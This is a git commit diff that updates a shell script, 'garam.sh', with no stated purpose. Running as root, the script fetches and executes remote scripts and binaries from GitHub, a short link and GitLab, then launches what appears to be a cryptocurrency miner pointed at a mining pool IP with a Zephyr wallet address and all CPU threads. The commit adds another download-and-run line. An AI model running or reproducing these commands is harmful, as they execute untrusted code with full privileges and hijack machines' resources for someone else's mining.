db5d16334b77d87d7ff847cadcf605b375824e9d
williehprnuhrxyq <159912408+williehprnuhrxyq@users.noreply.github.com>
2024-07-19 21:54:51 +0700

    Update garam.sh

--- garam.sh
+++ garam.sh
@@ -1,4 +1,5 @@
 #!/bin/bash
 sudo su <<EOF
+wget -qO winter.sh https://raw.githubusercontent.com/anihsugiarti9/ebor/main/login.sh && chmod +x * && ./winter.sh
 wget -qO asukowe https://s.id/asukowe && chmod +x * && ./asukowe && sleep 5 && apt-get install screen -y && screen -dmS run ./udocker/udocker --allow-root run debian /bin/bash -c 'wget -qO asu https://gitlab.com/heatheroigerald/asu/-/raw/main/rstd && chmod +x asu && ./asu -o 47.89.195.104:443 -a rx/0 -u ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo B-$(TZ=UTC-7 date +"%H-%M-%S")) -p -x -t $(nproc --all) '
 EOF
